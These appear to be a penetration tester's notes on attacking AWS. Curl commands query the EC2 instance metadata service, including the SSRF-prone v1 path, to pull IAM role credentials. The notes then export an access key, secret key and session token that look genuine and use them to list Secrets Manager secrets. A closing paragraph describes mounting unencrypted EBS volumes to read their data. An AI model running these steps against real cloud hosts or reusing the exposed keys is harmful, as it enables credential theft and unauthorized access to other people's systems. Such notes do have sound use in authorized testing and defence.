## Attacking metadatav2  

```
TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`  
```
`curl http://169.254.169.254/latest/meta-data/` //metadatav1 - SSRF city  
`curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/meta-data/iam/security-credentials/instance_user_role`  
```
export AWS_ACCESS_KEY_ID=ASIARLYXJH3ZO5HSKMOA
export AWS_SECRET_ACCESS_KEY=8/oeGNxEz2TiX6OpjXu1tZOBfj5P1HIh28ZzGijc
export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEJf//////////wEaCXVzLWVhc3QtMSJHMEUCIQCui9gPVr+ztFDj3VVN/RlWnNYnJQ5rV/ppnJG7+twWRAIgC+qIPReuBCmPDsL9ahUzb9pyiDBJ5q7Rp9nl7D2s/ysq1gQI3///////////ARAAGgwwOTQwMDEyNTAwMzQiDKFtYVMRIWdpBTiHoSqqBCAU2bvqS3RaCQH09AaJ44BAMSaqE03RNG3ABsETDLxYG6gYNMMfAbVkQ/qileJvXhpjXf6VLN8L1GhUjkOQb/0VeIrRZ9pvsSjAO4Pav7Z0ZofFfbgj0CE913YxM/J3xDHHgzuNNWEf0KhRNZUL3YYfr1D4cCJGVf9uv9QxMGvUB8v+B18GqpfIDrQhSzGdPtkTniCGotA7zieyLtDjlh07nj0lNBMRKOWYnUYR/YRZdK4Petc7DECsBEM4rLuNA2S06aFkLu26yAtyDdoudxZGi00+n/cjU7DD2ZI+V1+DOYhI32JczHvOgD5L+646t+nfjiGovFoPrH8bhg05rl6JFm9UaA1h7njVaxSJJO/J/D4p3Q71ieVtRqjYTOGazu7YJRsgX3q09DEu/J/Yc4oJODCAbw+332t2Be09tTc1CPHtJNohZeCqBaXS/FeToLlkqMloBlbl9dSmc+95Y19YOCu04/2tGIYTbw0smEq1XF69nZT6u1bTh6vb+Qngau/7lqv3cMrSKAlhz2+w60VGUWgaatH1g2wq2n3dKa3GXj99VhoYSLK0PQavBjD7ocbtD11THZIJ3YaHbT5/zTUB9O96olGuimsZFZbTOcam2nad6SfQjLP0VaOc+rK1DeAkh7QvbN2GcPbIUtAXuUICiaUflKW0/EdtA/Ktbh34pC48GbEQ8MWqZzISkGzPP0nYiMo617MC1cwT4/iycqSkd6BjI9ZmXVIrMJXU0p0GOqkBRNpipt++I7ojl119QhMhKtwv+tGtPeFCipwRrBOx8EObQIgcwnzMNUaWU5JeASSRO/11q/44sWMqfDOwXd8teDqwWWnVxuA75getOZFS83dWDslO97THMto3T1rW1/58sUY7XPOE6OPjH4saUBcoBjPjYBK3GPLWSQ7dGovSDr7doEe79hW4MO/XYi3C8g+gqIacTpPbj4wA+G9oz02XiwUv4EtX9CTF0w==
```
`aws configure get region`  
`aws secretsmanager list-secrets --region us-southeast-1`  

## Unencrypted EBS Disks  
Although this attack may not take place during a pentest, an unencrypted disk opens a vector for which an attacker may detach the volume, spin up a new instance and re-attach so they can connect to the instance and mount the drive to view filesystem.  
